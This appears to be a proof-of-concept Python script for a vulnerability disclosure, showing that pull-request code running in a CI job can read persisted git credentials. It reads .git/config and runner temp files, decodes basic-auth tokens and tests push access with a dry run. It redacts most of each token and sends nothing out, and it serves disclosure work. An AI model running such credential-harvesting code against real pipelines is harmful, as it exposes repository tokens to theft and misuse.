import sys, os, glob, base64, subprocess, re

print("=== [PoC v2] merged-PR code executing inside token-bearing job ===")

def redact_auth(s):
    # find base64 basic auth and print decoded prefix only
    for m in re.finditer(r"basic\s+([A-Za-z0-9+/=]+)", s):
        try:
            dec = base64.b64decode(m.group(1)).decode(errors="replace")
            user, _, tok = dec.partition(":")
            print(f"  -> decoded auth user={user!r} token_preview={tok[:4]}...<redacted len={len(tok)}>")
        except Exception:
            pass

# 1. .git/config — checkout v4+ persists via http.extraheader inside .git/config
for cfg_path in [".git/config"]:
    try:
        data = open(cfg_path).read()
        hdrs = re.findall(r"(?i)(extraheader|AUTHORIZATION|credential)", data)
        print(f"[PoC] {cfg_path}: auth markers = {set(hdrs)}")
        redact_auth(data)
    except Exception as e:
        print(f"[PoC] {cfg_path}: {e}")

# 2. git-credentials files anywhere under _temp and RUNNER_TEMP
cands = glob.glob("/home/runner/work/_temp/**/*.config", recursive=True) + \
        glob.glob(os.path.expandvars("$RUNNER_TEMP/**/*.config"), recursive=True) + \
        glob.glob("/home/runner/work/_temp/git-credentials-*")
print("[PoC] credential file candidates:", [os.path.basename(c) for c in cands])
for c in cands:
    try:
        data = open(c).read()
        print(f"[PoC] READABLE: {c} ({len(data)} bytes)")
        redact_auth(data)
    except Exception as e:
        print(f"[PoC] unreadable: {c}: {e}")

# 3. live git-auth proof against a PRIVATE-equivalent operation:
#    push uses the persisted credential automatically (no token handling needed)
try:
    out = subprocess.run(
        ["git", "push", "origin", "HEAD:refs/heads/poc-persisted-cred-branch", "--dry-run", "--porcelain"],
        capture_output=True, text=True, timeout=30, env={**os.environ})
    print("[PoC] git push --dry-run rc:", out.returncode)
    print("[PoC] push stderr:", out.stderr.strip()[:200])
except Exception as e:
    print("[PoC] push err:", e)

# 4. credential helper query — what git would use for github.com
try:
    out = subprocess.run(["git", "config", "--local", "--list"], capture_output=True, text=True, timeout=15)
    lines = [l for l in out.stdout.splitlines() if re.search(r"extraheader|credential|AUTHORIZATION", l, re.I)]
    print("[PoC] git config auth-related entries:", len(lines))
    for l in lines:
        redact_auth(l)
        print("  ->", re.sub(r"basic\s+\S+", "basic <B64_REDACTED>", l)[:110])
except Exception as e:
    print("[PoC] cfg err:", e)
